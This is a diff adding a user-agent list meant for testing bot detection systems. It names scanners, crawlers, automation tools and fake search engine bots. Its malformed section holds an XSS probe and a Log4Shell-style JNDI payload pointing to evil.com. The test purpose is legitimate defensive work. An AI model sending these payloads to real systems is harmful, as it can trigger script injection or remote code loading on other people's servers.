@@ -1,0 +1,90 @@
+# Bot User-Agent Library
+# Comprehensive list for testing bot detection systems
+
+# ==== Known Bad Bots ====
+sqlmap/1.7
+nikto/2.5
+Acunetix Web Vulnerability Scanner
+Acunetix-Scanner
+OpenVAS
+Nessus
+w3af
+Wapiti
+ZmEu
+masscan/1.0
+zgrab/0.x
+EvilBot/1.0
+WinHttp.WinHttpRequest.5
+libwww-perl/6.00
+Python-urllib/2.7
+python-requests/2.31.0
+Go-http-client/1.1
+Java/1.8.0_121
+curl/8.0.0
+Wget/1.21
+http.rb/5.0
+
+# ==== Aggressive Crawlers ====
+AhrefsBot/7.0
+SemrushBot/7~bl
+MJ12bot/v1.4.8
+DotBot/1.1
+BLEXBot/1.0
+serpstatbot/1.0
+MegaIndex.ru/2.0
+DataForSeoBot/1.0
+SeznamBot/4.0
+YandexBot/3.0
+Baiduspider/2.0
+PetalBot
+Bytespider
+GPTBot
+ClaudeBot
+CCBot/2.0
+Applebot/0.1
+
+# ==== Headless Browsers ====
+HeadlessChrome/120.0.0.0
+PhantomJS/2.1.1
+Puppeteer
+Playwright
+Selenium
+MSIE 5.0 (compatible; PhantomJS)
+
+# ==== Spoofed/Malformed ====
+Mozilla/5.0 (compatible; evil scanner)
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)
+(Empty User-Agent)
+-
+null
+undefined
+<script>alert(1)</script>
+${jndi:ldap://evil.com/a}
+
+# ==== Known Scanner Fingerprints ====
+Burp Suite
+OWASP ZAP
+Skipfish
+Arachni/v1
+dirb
+dirbuster
+gobuster
+ffuf
+feroxbuster
+nuclei/2.9
+httpx
+xray
+
+# ==== Fake Search Engines ====
+Googlebot/2.1 (+http://www.google.com/bot.html)
+bingbot/2.0
+Googlebot-Image/1.0
+AdsBot-Google
+facebookexternalhit/1.1
+
+# ==== Browser Automation ====
+Selenium/4.0
+WebDriver
+ChromeDriver
+EdgeDriver
+GeckoDriver
